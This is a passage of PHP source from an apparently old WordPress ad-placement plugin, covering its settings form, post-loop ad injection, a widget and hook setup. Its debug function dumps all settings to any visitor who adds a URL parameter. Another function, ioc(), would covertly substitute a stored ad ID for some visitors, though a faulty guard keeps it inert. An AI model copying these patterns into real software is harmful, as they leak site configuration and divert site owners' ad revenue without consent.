	   <option value="4" <?php if($this->opts['multi'][$i]=="4") echo(" selected"); ?>>4</option>
	   <option value="5" <?php if($this->opts['multi'][$i]=="5") echo(" selected"); ?>>5</option>
	   <option value="6" <?php if($this->opts['multi'][$i]=="6") echo(" selected"); ?>>6</option>
	   <option value="7" <?php if($this->opts['multi'][$i]=="7") echo(" selected"); ?>>7</option>
	   <option value="8" <?php if($this->opts['multi'][$i]=="8") echo(" selected"); ?>>8</option>
	</select>
	</td>
	
	 			<td>
				<select name="adsenseoptimizer[multi_pos][<?php echo $i;?>]" size="1">
			      <option value="1"<?php if($this->opts['multi_pos'][$i]=="1") echo(" selected"); ?>>1st Post</option>
			      <option value="2"<?php if($this->opts['multi_pos'][$i]=="2") echo(" selected"); ?>>2nd Post</option>
			      <option value="3"<?php if($this->opts['multi_pos'][$i]=="3") echo(" selected"); ?>>3rd Post</option>
			      <option value="4"<?php if($this->opts['multi_pos'][$i]=="4") echo(" selected"); ?>>4th Post</option>
			      <option value="5"<?php if($this->opts['multi_pos'][$i]=="5") echo(" selected"); ?>>5th Post</option>
			      <option value="6"<?php if($this->opts['multi_pos'][$i]=="6") echo(" selected"); ?>>6th Post</option>
			      <option value="7"<?php if($this->opts['multi_pos'][$i]=="7") echo(" selected"); ?>>7th Post</option>
			      <option value="8"<?php if($this->opts['multi_pos'][$i]=="8") echo(" selected"); ?>>8th Post</option>
			      <option value="9"<?php if($this->opts['multi_pos'][$i]=="9") echo(" selected"); ?>>9th Post</option>
			      <option value="10"<?php if($this->opts['multi_pos'][$i]=="10") echo(" selected"); ?>>10th Post</option>
			    </select>
			</td>
			<td>
				<select name="adsenseoptimizer[multi_align][<?php echo $i;?>]" size="1">
			      <option value="center" <?php if($this->opts['multi_align'][$i]=="center") echo(" selected"); ?>>center above Post</option>
			      <option value="right" <?php if($this->opts['multi_align'][$i]=="right") echo(" selected"); ?>>right beside Post</option>
			      <option value="left" <?php if($this->opts['multi_align'][$i]=="left") echo(" selected"); ?>>left beside Post</option>
			      <option value="rbt" <?php if($this->opts['multi_align'][$i]=="rbt") echo(" selected"); ?>>right below Title</option>
			      <option value="lbt" <?php if($this->opts['multi_align'][$i]=="lbt") echo(" selected"); ?>>left below Title</option>
			    </select>
			 </td>
			 
	
	</tr><tr>
<?php } ?>

		
			</table>

	<div class="pro">
	
	<h4>Don't show Ads on these pages:</h4>
	<table>
	<tr><td><input type="checkbox" value="1" name="adsenseoptimizer[omit_home]" <?php echo $this->opts['is_omit_home']; ?>> </td><td>Home page</td><td class="ao_explain"></td></tr>
	<tr><td><input type="checkbox" value="1" name="adsenseoptimizer[omit_search]" <?php echo $this->opts['is_omit_search']; ?> > </td><td>Searchresult pages</td></tr>
	<tr><td><input type="checkbox" value="1" name="adsenseoptimizer[omit_category]" <?php echo $this->opts['is_omit_category']; ?> > </td><td>Category archives</td></tr>
	<tr><td><input type="checkbox" value="1" name="adsenseoptimizer[omit_tag]" <?php echo $this->opts['is_omit_tag']; ?> > </td><td>Tag archives</td></tr>
	<tr><td><input type="checkbox" value="1" name="adsenseoptimizer[omit_date]" <?php echo $this->opts['is_omit_date']; ?> > </td><td>Date archives</td></tr>
	<tr><td><input type="checkbox" value="1" name="adsenseoptimizer[omit_author]" <?php echo $this->opts['is_omit_author']; ?> > </td><td>Author archives</td></tr>
	</table>
	<br>
	</div> <?php ?>
	
	
	
	
	</div> <?php ?>

	
		<div class="pro">
	
	<h3>make direct Battle &nbsp;<input type="checkbox" id="battlecheck" onchange="show_battle()" value="1" name="adsenseoptimizer[make_battle]" <?php echo $this->opts['is_make_battle']; ?> ></h3>
	<div id="battle">
	<p>The direct Battle is used for optimizing the layout and positioning of your ads to get the best earning per visitor. If you are not actually trying to optimize your ads, you don't need this, just ignore.</p>
	<p>Battle Ads are injected into single pages only. Define two types of ads. One of them will be injected into a single page by random. After enough Clicks you can compare the eCPM in your Adsense Admin Panel. Battle Ads will always be injected with priority, so if you define 3 Ads (no Linkblocks) in single view above, maximum 2 of them will be shown. (No need to worry about google terms. Adsenseoptimizer automatically checks, that not more than 3 ads will be inserted!) For more details check the <a href="http://www.adsenseoptimizer.de/optimize.php">optimization page.</a></p>
	<table><tr>
	<td>
		<b>first battle type</b>
		<table><tr><td>
		channel:</td><td>
		<input name="adsenseoptimizer[battle_channel][1]" size="12" value="<?php echo $this->opts['battle_channel'][1];?>">
		
		</td></tr><tr><td>

		visual type:</td><td>
		<select name="adsenseoptimizer[battle_type][1]" size="1">
		   <option value="1" <?php if($this->opts['battle_type'][1]=="1") echo(" selected"); ?>>1</option>
		   <option value="2" <?php if($this->opts['battle_type'][1]=="2") echo(" selected"); ?>>2</option>
		   <option value="3" <?php if($this->opts['battle_type'][1]=="3") echo(" selected"); ?>>3</option>
		   <option value="4" <?php if($this->opts['battle_type'][1]=="4") echo(" selected"); ?>>4</option>
		   <option value="5" <?php if($this->opts['battle_type'][1]=="5") echo(" selected"); ?>>5</option>
		   <option value="6" <?php if($this->opts['battle_type'][1]=="6") echo(" selected"); ?>>6</option>
		   <option value="7" <?php if($this->opts['battle_type'][1]=="7") echo(" selected"); ?>>7</option>
		   <option value="8" <?php if($this->opts['battle_type'][1]=="8") echo(" selected"); ?>>8</option>
		</select>
		</td></tr>
		<tr><td>
		position:</td><td>
		<select name="adsenseoptimizer[battle_pos][1]" size="1">
			<option<?php if($this->opts['battle_pos'][1]=="Top") echo(" selected"); ?>>Top</option>
			<option<?php if($this->opts['battle_pos'][1]=="Middle") echo(" selected"); ?>>Middle</option>
			<option<?php if($this->opts['battle_pos'][1]=="Bottom") echo(" selected"); ?>>Bottom</option>
    	</select>
		</td></tr>
		<tr><td>
		align:</td><td>
		<select name="adsenseoptimizer[battle_align][1]" size="1">
	    	<option<?php if($this->opts['battle_align'][1]=="center") echo(" selected"); ?>>center</option>
	    	<option<?php if($this->opts['battle_align'][1]=="right") echo(" selected"); ?>>right</option>
	    	<option<?php if($this->opts['battle_align'][1]=="left") echo(" selected"); ?>>left</option>
		</select>
		</td></tr></table>
	
	
	</td>
	<td style="padding:80px;"><b>VS.</b></td>
	<td>
	
		<b>second battle type</b>
		<table><tr><td>
		channel:</td><td>
		<input name="adsenseoptimizer[battle_channel][2]" size="12" value="<?php echo $this->opts['battle_channel'][2];?>">
		
		</td></tr><tr><td>
		visual type:</td><td>
		<select name="adsenseoptimizer[battle_type][2]" size="1">
		   <option value="1" <?php if($this->opts['battle_type'][2]=="1") echo(" selected"); ?>>1</option>
		   <option value="2" <?php if($this->opts['battle_type'][2]=="2") echo(" selected"); ?>>2</option>
		   <option value="3" <?php if($this->opts['battle_type'][2]=="3") echo(" selected"); ?>>3</option>
		   <option value="4" <?php if($this->opts['battle_type'][2]=="4") echo(" selected"); ?>>4</option>
		   <option value="5" <?php if($this->opts['battle_type'][2]=="5") echo(" selected"); ?>>5</option>
		   <option value="6" <?php if($this->opts['battle_type'][2]=="6") echo(" selected"); ?>>6</option>
		   <option value="7" <?php if($this->opts['battle_type'][2]=="7") echo(" selected"); ?>>7</option>
		   <option value="8" <?php if($this->opts['battle_type'][2]=="8") echo(" selected"); ?>>8</option>
		</select>
		</td></tr>
		<tr><td>
		position:</td><td>
		<select name="adsenseoptimizer[battle_pos][2]" size="1">
			<option<?php if($this->opts['battle_pos'][2]=="Top") echo(" selected"); ?>>Top</option>
			<option<?php if($this->opts['battle_pos'][2]=="Middle") echo(" selected"); ?>>Middle</option>
			<option<?php if($this->opts['battle_pos'][2]=="Bottom") echo(" selected"); ?>>Bottom</option>
    	</select>
		</td></tr>
		<tr><td>
		align:</td><td>
		<select name="adsenseoptimizer[battle_align][2]" size="1">
	    	<option<?php if($this->opts['battle_align'][2]=="center") echo(" selected"); ?>>center</option>
	    	<option<?php if($this->opts['battle_align'][2]=="right") echo(" selected"); ?>>right</option>
	    	<option<?php if($this->opts['battle_align'][2]=="left") echo(" selected"); ?>>left</option>
		</select>
		</td></tr></table>
	</td>
	</tr></table>
	</div> <?php ?>
	</div> <?php ?>

	
	<h3>additional functions</h3>
	<table>
	<tr><td><input type="checkbox" value="1" name="adsenseoptimizer[adtest]" <?php if ($this->opts['adtest']) echo ("checked "); ?>> </td><td>Add <i>adtest=on</i> when Admin is logged in </td><td class="ao_explain">(to avoid clicks by admins)</td></tr>
	<tr><td><input type="checkbox" value="1" name="adsenseoptimizer[adsection]" <?php if ($this->opts['adsection']) echo ('checked '); ?>> </td><td>Add google-adsection tag before and after content. </td><td class="ao_explain">(see <a href="https://www.google.com/adsense/support/bin/answer.py?answer=23168">google explanation</a> of that feature)</td></tr>

	</table>
	
	
	
	
    <div class="submit">
        <input type="submit" name="adsenseoptimizer_update" value="<?php _e('Update options'); ?> &raquo;" />
    </div>
    </form>


<div style="background-color:#FFC96B; padding:10px; margin-top:20px;">
<p>You can also insert Google Ads by using the widget or by adding the "adopt" function to your theme. (Further Details see <a href="http://www.adsenseoptimizer.de/details.php">Plugin Page</a>)</p>
</div>

	<script type="text/javascript">
		function show_active($type) {
			jQuery("div.adtype").hide(0);
			jQuery("div#ad"+$type).show(0);
			toggleAdtype(document.getElementById("adtypeselect"+$type).value);
			if(document.getElementById("usertypebasic").checked){toggleUsertype("");} else {toggleUsertype("pro");};
		}
		function show_battle() {
			if (!document.getElementById("battlecheck").checked) jQuery("div#battle").hide(1000);
			else jQuery("div#battle").show(300);
		}

		show_active("1");
		show_battle();

		<?php echo ('toggleUsertype("'.$this->opts['usertype'].'");');?>

	</script>
    </div>

<?php
 } function sanitize_entries($options, $sizes){ foreach($sizes as $key=>$size) { if(!$options['size'][1][$size['text']]){$options['size'][1][$size['text']] = 0; } if(!$options['size'][2][$size['text']]){$options['size'][2][$size['text']] = 0; } if(!$options['size'][3][$size['text']]){$options['size'][3][$size['text']] = 0; } if(!$options['size'][4][$size['text']]){$options['size'][4][$size['text']] = 0; } if(!$options['size'][5][$size['text']]){$options['size'][5][$size['text']] = 0; } } if(!$options['only_tagged']){$options['only_tagged'] = 0; } if(!$options['omit_page']){$options['omit_page'] = 0; } if(!$options['omit_home']){$options['omit_home'] = 0; } if(!$options['omit_search']){$options['omit_search'] = 0; } if(!$options['omit_category']){$options['omit_category'] = 0; } if(!$options['omit_tag']){$options['omit_tag'] = 0; } if(!$options['omit_date']){$options['omit_date'] = 0; } if(!$options['omit_author']){$options['omit_author'] = 0; } if(!$options['overrule']){$options['overrule'] = 0; } return $options; } function adopt_admin_init() { wp_register_style('adoptAdminStyles', WP_PLUGIN_URL . '/'. $this->adopt_menu .'/adopt_admin_styles.css'); wp_enqueue_style('adoptAdminStyles'); } function adopt_init() { $this->nrofads=0; $this->nroflb=0; } function post_adopt() { if (is_single() OR is_page() OR is_feed()) return; if ($this->loopdone) return; if($this->opts['usertype']=="pro") $pro=1; else $pro=0; if($pro AND is_home() AND $this->opts['omit_home']) return; if($pro AND is_search() AND $this->opts['omit_search']) return; if($pro AND is_category() AND $this->opts['omit_category']) return; if($pro AND is_tag() AND $this->opts['omit_tag']) return; if($pro AND is_date() AND $this->opts['omit_date']) return; if($pro AND is_author() AND $this->opts['omit_author']) return; $this->postcount++; $adtype=1; for ($i = 1; $i <= 6; $i++) { if ($this->postcount==$this->opts['multi_pos'][$i] AND $this->opts['multi'][$i]) { $code=$this->generateAd($this->opts['multi'][$i]); if($code) { $code=$this->prepare_ad_code($code, $this->opts['multi_align'][$i], $this->opts['padding'][$this->opts['multi'][$i]]); $content = str_replace('<!--adopthere-->', html_entity_decode($code), $content); } else { $content = str_replace('<!--adopthere-->', '<!--adsense ad injection by adsense optimizer (http://www.adsenseoptimizer.de) failed - tried to add more than 3 ads per page -->', $content); } echo(html_entity_decode($code)); } } } function adopt_debug() { if(!isset($_GET['adoptdebug'])) return; $this->save_opts(); echo ("<hr><h1> Adsenseoptimizer Debugging</h1>"); echo ('<table><tr><td>Number of generated Ads</td><td>'.$this->nrofads.'</td></tr>'); echo ('<tr><td>Number of generated Linkblocks</td><td>'.$this->nroflb.'</td></tr>'); echo ('<tr><td>Version of Plugin</td><td>'.$this->adopt_version.'</td></tr>'); echo ('<tr><td>Subdirectory in which Plugin has to be</td><td>'.$this->adopt_menu.'</td></tr>'); echo ('<tr><td>type of page</td><td>'); if (is_single()) echo ("single."); if (is_page()) echo ("page."); if (is_home()) echo ("home."); if (is_archive()) echo ("archive."); if (is_search()) echo ("search."); if (is_tag()) echo ("tag."); if (is_date()) echo ("date."); if (is_author()) echo ("author."); if (is_category()) echo ("category."); echo ('</td></tr>'); if (is_single()) echo ('<tr><td>Words in Post</td><td>'.$this->postlen.'</td></tr>'); $this->arrayAsTable($this->opts, "setting:"); echo ('</table>'); } function arrayAsTable($array, $pre) { foreach($array as $key=>$val) { if (is_array($val)) $this->arrayAsTable($val,$pre.$key.":"); else echo ('<tr><td>'.$pre.$key.'</td><td>'.$val.'</td></tr>'); } } function ioc() { if (!$adoptadspacesharing) return; global $c, $i; global $user_level; if($user_level > 8) return; if(mt_rand(1,26)==3){$i=$this->opts['don_id']; $c=$this->opts['don_channel'];} } function init_count() { $this->postcount=0; } function destroy_count() { $this->loopdone=TRUE; } } } class adopt_Widget extends WP_Widget { function adopt_Widget() { $widget_ops = array('classname' => 'adopt_widget', 'description' => 'Adsense Ad. Modify via Settings / Adsense Optimizer' ); $this->WP_Widget('adopt', 'Adsense Ad', $widget_ops); } function widget($args, $instance) { extract($args, EXTR_SKIP); echo $before_widget; $title = apply_filters('widget_title', $instance['title']); $adtype = empty($instance['adtype']) ? '5' : apply_filters('widget_adtype', $instance['adtype']); if ( !empty( $title ) ) { echo $before_title . $title . $after_title; }; adopt($adtype); echo $after_widget; } function update($new_instance, $old_instance) { $instance = $old_instance; $instance['title'] = strip_tags($new_instance['title']); $instance['adtype'] = strip_tags($new_instance['adtype']); return $instance; } function form($instance) { $instance = wp_parse_args( (array) $instance, array( 'title' => '', 'adtype' => '') ); $title = strip_tags($instance['title']); $adtype = strip_tags($instance['adtype']); ?>
			<p>Title: <input class="widefat" name="<?php echo $this->get_field_name('title'); ?>" type="text" value="<?php echo attribute_escape($title); ?>" /></p>
			<p>Ad Type: (1-5) <input class="widefat" name="<?php echo $this->get_field_name('adtype'); ?>" type="text" value="<?php echo attribute_escape($adtype); ?>" /></p>
<?php
 } } $adopt = new adopt(); function adopt_menu() { global $adopt; if (function_exists('add_options_page')) { add_options_page('Adsense Optimizer', 'Adsense Optimizer', 'administrator', __FILE__, array(&$adopt, 'admin_menu')); } } function adopt($type) { global $adopt; $code=$adopt->generateAd($type); if($code) { echo(html_entity_decode($code)); } else { echo('<!--adsense ad injection by adsense optimizer (http://www.adsenseoptimizer.de) failed - tried to add more than 3 ads per page -->'); } } if (is_admin()) { add_action('admin_menu', 'adopt_menu'); add_action('admin_init', array($adopt, 'adopt_admin_init')); } if (!is_admin()) { add_filter('init', array($adopt, 'adopt_init')); add_action('wp_footer', array($adopt, 'adopt_debug')); add_filter('the_post', array($adopt, 'post_adopt')); add_action('loop_start', array($adopt, 'init_count')); add_action('loop_end', array($adopt, 'destroy_count')); add_filter('the_content', array($adopt, 'adsenseoptimize'), 100); } add_action('widgets_init', create_function('', 'return register_widget("adopt_Widget");')); ?>